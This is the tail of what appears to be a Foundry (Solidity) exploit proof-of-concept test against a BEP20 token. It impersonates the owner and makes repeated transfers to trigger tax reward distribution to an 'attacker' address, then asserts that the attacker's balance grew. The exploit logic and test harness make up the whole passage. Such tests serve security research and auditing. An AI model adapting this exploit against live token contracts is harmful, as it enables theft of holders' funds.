            console.log("Helper1 -> Helper2 transfer succeeded");
        } catch {
            console.log("Helper1 -> Helper2 transfer failed due to sell restrictions");
        }

        // Alternative approach: Use owner to transfer to multiple addresses
        // This will trigger tax distribution to all existing _accounts (including attacker)
        vm.startPrank(ownerAddress);
        for (uint i = 0; i < 10; i++) {
            // Create a new address for each transfer
            address temp = address(uint160(uint256(keccak256(abi.encodePacked(i)))));

            // Transfer a small amount to trigger tax distribution
            IBEP20(TARGET).transfer(temp, 100 * 10**18);

            // Each transfer should distribute tax to all _accounts except sender (owner) and recipient (temp)
            // Since attacker is in _accounts array, they should receive tax rewards
        }
        vm.stopPrank();

        // Check final balance
        uint256 finalBalance = IBEP20(TARGET).balanceOf(attacker);
        console.log("Final attacker balance:", finalBalance);
        console.log("Balance increase:", finalBalance - initialBalance);

        // Verify the exploit worked
        assertGt(finalBalance, initialBalance, "Attacker balance should have increased from tax rewards");
    }



    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

